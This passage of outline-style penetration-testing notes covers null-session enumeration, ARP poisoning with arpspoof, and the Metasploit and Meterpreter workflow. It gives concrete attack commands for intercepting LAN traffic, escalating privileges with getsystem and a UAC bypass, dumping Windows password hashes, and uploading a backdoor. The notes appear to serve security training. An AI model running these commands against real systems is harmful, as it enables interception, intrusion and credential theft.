                    - Winfo is another command line utility you can use to automate null session exploitation. To use it, you just need to specify the target IP address and use the "-n" command line switch to tell the tool to use null sessions. `winfo <target IP address> -n`
                - Exploiting Null Sessions with Enum4linux:
                    - A penetration tester can also exploit null sessions by using enum4linux, a PERL script that can perform the same operations of enum and Winfo.
                    - By default, it performs:
                        - User enumeration
                        - Share enumeration
                        - Group and member enumeration
                        - Password policy extraction
                        - OS information detection
                        - A nmblookup run
                        - Printer information extraction
                - About Null Sessions:
                    - Null sessions are a piece of the history of Windows hacking. Even if by default they are not enabled on modern Microsoft operating systems, you can sometimes find them on enterprise networks; this is because of retro compatibility with legacy systems and applications.
        - ARP Poisoning
            - ARP Poisoning is a powerful attack you can use to intercept traffic on a switched network.
            - To identify the MAC address of a host, computers use the Address Resolution Protocol.
            - After the MAC address resolution is complete, hosts save the destination address in their ARP cache table.
            - If an attacker manipulates the ARP tables of the two parties involved in a communication, it will be able to sniff the whole communication, thus performing a man-in-the-middle (MITM) attack! This can be done by sending gratuitous ARP replies.
            - ARP Poisoning Actors:
                - During an ARP poisoning attack, three actors are involved:
                    - Two network nodes (clients, servers, routers, printers, ...)
                    - The attacker
            - Gratuitous ARP Replies:
                - The attacker can manipulate other hosts' ARP cache tables by sending gratuitous ARP replies.
                - Gratuitous ARP replies are unsolicited ARP reply messages. In other words, the attacker sends a reply without waiting for a host to perform a request.
                - The attacker exploits gratuitous ARP messages to tell the victims that they can reach a specific IP address at the attacker's machine MAC address.
                - As soon as the ARP cache table contains fake information, every packet of every communication between the poisoned nodes will be sent to the attacker's machine.
                - The attacker can prevent the poisoned entry from expiring by sending gratuitous ARP replies every 30 seconds or so.
            - Forwarding and Mangling Packets:
                - As soon as the attacker's machine receives the packets, it must forward them to the correct destination. Otherwise, the communication between the victim hosts will not work.
                - This operation lets the hacker sniff traffic between the poisoned hosts even if the machines sit on a switches network.
                - This activity can go further because the attacker can also change the content of the packets thus manipulating the information exchanged by the two parties!
            - Local to Remote Man in the Middle:
                - This kind of attack can be even used on an entire network and against a router, letting an attacker intercept the communication between a LAN and the Internet!
            - Dsniff Arpspoof:
                - Dsniff is a collection of tools for network auditing and penetration testing. It includes arpspoof a utility designed to intercept traffic on a switches LAN.
                - Before running the tool, you have to enable the Linux Kernel IP Forwarding, a feature that transforms a Linux box into a router.
                - By enabling IP forwarding, you tell your machine to forward the packets you intercept to the real destination host: `echo 1 > /proc/sys/net/ipv4/ip_forward`
                - You can then run arpspoof: `arpspoof -i <interface> -t <target> -r <host>`
                    - Interface is the NIC you want to use, for example, eth0 for your local LAN or tap0.
                    - Target and Host are the victims IP addresses.
        - Metasploit
            - Metasploit is an open-source framework used for penetration testing and exploit development. It is available for MacOSX, Windows and Linux operating systems.
            - Metasploit gives you a wide array of community contributed exploits and attack vectors that can be used against various systems and technologies. Moreover, it is extensible and can be used to automate your own exploits.
            - MSFConsole:
                - Metasploit has a web interface, a command line interface and a console interface, MSFConsole.
                - The basic workflow to exploit a target by using MSFConsole is:
                    - Identifying a vulnerable service
                    - Searching for a proper exploit for that service
                    - Loading and configuring the exploit
                    - Loading and configuring the payload you want to use
                    - Running the exploit code and getting access to the vulnerable machine
                    - You can start MSFConsole by typing the following on the command line: `msfconsole`
            - Identifying a Vulnerable Service:
                - The information gathering phase is of paramount importance for a successful penetration test. Moreover, you need to perform a vulnerability assessment step before moving to the actual exploitation phase.
            - Searching:
                - Metasploit contains exploit code and other features in its modules. `msf> serach <serachTerm>`
                - Another way to display exploits is by using the show command: `show exploits`
            - Configuring an Exploit:
                - After choosing the exploit you want to use, you can enable it by using the "use" command, followed by the exploit path: `use <exploit/path>`
                - Note how MSFConsole promptly changes when an exploit is selected; this happens because Metasploit uses a file-system-like hierarchy to store encoders, nops, exploits, payloads, and auxiliary modules.
                - If you want to go back to the main msf prompt, you can use the "back" command.
                - Once an exploit is loaded, you can view related information using the "info" command.
                - You can also check its options by using the "show options" command.
                - To configure an option, you have to use the "set" command.
            - Configuring a Payload:
                - To run an exploit, a payload is needed. Payloads are pieces of code injected by an exploit module into the victim machine or service.  
                - A payload is used by an attacker to get:
                    - An OS Shell
                    - A VNC or RDP connection
                    - A Meterpreter shell
                    - The execution of an attacker-supplied application.
                - Metasploit provides different payloads for different operating systems, with different architectures, and with different features. You can list them all by typing "show payloads" on the MSFConsole prompt.
                - If you launch a "show payloads" command when you are using an exploit, you will see only the payloads which work with that specific exploit.
                - You can choose a payload to use by issuing the "set payload" command, followed by the payload name. Then you can check its options by using the show options command.
                - To configure a payload, use the "set" command.
                - After configuring the exploit and the payload, you are ready to launch the attack!
            - Running an Exploit:
                - Launching an exploit is just a matter of issuing the "exploit" command on the command line.
                - Most of the time, penetration testers aim to gain a shell on the target machine. They can achieve that by choosing the right Metasploit payload. A special payload, with many useful features under the pentesting point of view, is Meterpreter.
        - Meterpreter
            - Meterpreter is a very powerful shell which runs on Android, BSD, Java, Linux, PHP, Python, and Windows vulnerable applications and services.
            - Meterpreter is more than a simple shell. It provides advanced features to gather information, transfer files between the attacker and victim machines, install backdoors and more.
            - To list all the possible Meterpreter payloads, you can run a search in MSFConsole: `search meterpreter`
            - Choosing the payload is a matter of using the "set" command. For example, when attacking a Windows machine, you will use: `set payload <exploit/path>`
            - Bind and Reverse:
                - Meterpreter can both wait for a connection on the target machine or connect back to the attacker machine. Its most used configurations are "bind_tcp" and "reverse_tcp"
                    - "bind_tcp" runs a server process on the target machine that waits for connections from the attacker machine
                    - "reverse_tcp" performs a TCP connection back to the attacker machine. As you saw in the Backdoors chapter, this feature could help evade firewall rules.
            - Launching Meterpreter:
                - After you set the right payload for your attack, you have to run the exploit to get a Meterpreter session.
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2Fa6q_lHeb1E.png?alt=media&token=76fcfcbf-bb46-4a66-964d-a86a964233eb)
                - A Meterpreter session is an advanced shell on the target machine.
            - Sessions:
                - A single instance of MSFConsole can host multiple Meterpreter sessions; this means that you can instance multiple shells on your targets and switch between them.
                - You can switch from a Meterpreter session to the console by using the background command: `meterpreter> background`
                - You can then list currently opened sessions by using the `sessions -l` command
                - To resume a background session, you have to use the `sessions -i` command, followed with the number.
            - Information Gathering with Meterpreter:
                - Meterpreter lets you perform information gathering on the exploited machine and the network it is attached to. You can retrieve:
                    - Information about the machine and the OS
                    - The network configuration in use
                    - The routing table of the compromised host
                    - Information about the user running the exploited process
                - System Information:
                    - The `sysinfo` command lets you retrieve information about the exploited machine: name, operating system, architecture, system language and the Meterpreter version it is running.
                - Network Configuration:
                    - The `ifconfig` command prints the network configuration.
                - Routing Information:
                    - You can check routing information with the `route` command.
                - Current User:
                    - To know which user is running the process exploited by Metasploit, you can use the `getuid` command.
            - Privilege Escalation:
                - If the owner of the process does not have high privileges on the victim system, you can use the `getsystem` command. This command runs a privilege escalation routine on the target machine. In Windows environments, the system user has the highest privileges on a machine.
                - Bypassing UAC:
                    - Note that in modern Windows operating systems, the User Account Control (UAC) policy prevents privilege escalation.
                    - You can bypass that restriction by using the `bypassuac` module.
                    - This module takes just one argument, the Meterpreter session where you want to bypass UAC.
                    - After launching the exploit, you get a new Meterpreter session.
                    - The new session has the UAC policy disabled, so the `getsystem` command works!
            - Dumping the Password Database:
                - You can dump the passowrds database and save it for an offline cracking session. The hashdump module dumps the password database of an Windows machine.
                - `use post/windows/gather/hashdump`
                - `exploit`
            - Exploring the Victim System:
                - Meterpreter lets you navigate the victim's hard drive by using Unix-like shell commands: pwd, ls, etc.,.
            - Uploading and Downloading:
                - You can upload and download files by using the homonymous commands.
                - `meterpreter> download logs.txt /root/`
                - `meterpreter> upload /root/backdoor.ext C:\\Windows`
            - Running an OS Shell:
                - You can also run a standard operating system shell: `meterpreter> shell`
            - The Help:
                - Every Meterpreter command has brief help information. You can check it by using the "-h" parameter on the command line.
